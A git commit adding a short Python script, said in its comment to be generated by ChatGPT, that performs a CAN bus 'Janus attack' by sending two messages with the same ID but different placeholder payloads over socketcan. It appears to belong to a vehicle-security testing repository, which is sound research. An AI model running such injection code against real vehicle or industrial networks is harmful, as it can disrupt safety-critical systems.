6ad849b1609b5ca5f212db257fa0d67788e8fff2
Jay Turla <shipcodez@gmail.com>
2023-03-16 02:42:51 +0800

    Create janus_attack.py

---
+++ unittest/janus_attack.py
@@ -0,0 +1,21 @@
+# made by ChatGPT
+# A CAN bus Janus attack is a type of attack on a Controller Area Network (CAN) bus, 
+# where an attacker sends malicious messages with duplicate message IDs to confuse or 
+# disrupt the communication between the devices on the network. This type of attack 
+# is known as a "Janus attack" because it has two faces, where the attacker sends messages 
+# with two different payloads but the same message ID.
+
+import can
+
+# Define the CAN bus interface
+bus = can.interface.Bus(bustype='socketcan', channel='can0')
+
+# Define the two payloads for the Janus attack
+payload1 = b'\x11\x22\x33\x44'
+payload2 = b'\x55\x66\x77\x88'
+
+# Send the two messages with the same ID to perform the Janus attack
+msg1 = can.Message(arbitration_id=0x123, data=payload1)
+msg2 = can.Message(arbitration_id=0x123, data=payload2)
+bus.send(msg1)
+bus.send(msg2)
